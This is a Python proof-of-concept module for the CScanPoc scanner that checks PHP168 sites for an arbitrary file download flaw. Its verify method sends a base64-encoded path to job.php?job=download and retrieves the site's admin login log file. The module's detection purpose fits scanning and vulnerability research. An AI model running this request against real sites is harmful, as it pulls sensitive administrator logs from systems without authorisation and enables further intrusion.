# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64

class Vuln(ABVuln):
    poc_id = '7e7d4472-2b48-4ee5-b6ae-e9da94919c3e'
    name = 'PHP168整站任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        PHP168 /cache/adminlogin_logs.php 整站任意文件下载。
    '''  # 漏洞描述
    ref = 'https://blog.csdn.net/Liuhuaijin/article/details/78090137'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHP168'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b068d103-579d-4cb8-9d6c-c4f216f2d70c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            base = self.target + '/cache/adminlogin_logs.php' 
            s = base64.b64encode(base)
            payload = "/job.php?job=download&url=%s" % s 
            url = self.target + payload
            #code ,head,res,body,_ = curl.curl(url)
            r = requests.get(url)

            if r.status_code == 200 and 'logdb' in r.content:
                #security_warning(url)  
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
